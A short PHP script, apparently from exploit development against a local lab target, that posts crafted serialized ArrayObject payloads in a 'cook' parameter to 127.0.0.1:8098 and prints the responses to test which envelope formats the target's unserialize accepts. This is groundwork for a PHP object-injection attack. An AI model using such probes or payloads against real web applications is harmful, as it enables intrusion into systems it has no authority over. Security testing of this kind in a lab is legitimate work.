<?php
// Live-target envelope probe for SPL C: payloads (source shape: x:<flags>;<array>[m:<members>])
function try_send(string $payload): string {
    $ch = curl_init('http://127.0.0.1:8098/index.php');
    curl_setopt_array($ch, [CURLOPT_POST=>1, CURLOPT_POSTFIELDS=>http_build_query(['cook'=>$payload]), CURLOPT_RETURNTRANSFER=>1, CURLOPT_TIMEOUT=>5]);
    $r = curl_exec($ch);
    return $r === false ? 'CURLERR' : $r;
}
$inner = 'a:1:{s:1:"x";i:7;}';
$envs = [
    "x:i:0;{$inner}",
    "x:i:0;{$inner}m:a:0:{}",
    "x:i:0;{$inner};m:a:0:{}",
    "x:i:0;{$inner}m:N;",
];
foreach ($envs as $e) {
    $t = sprintf('C:11:"ArrayObject":%d:{%s}', strlen($e), $e);
    $r = try_send($t);
    printf("env=%-52s -> %s\n", $e, substr($r,0,90));
}
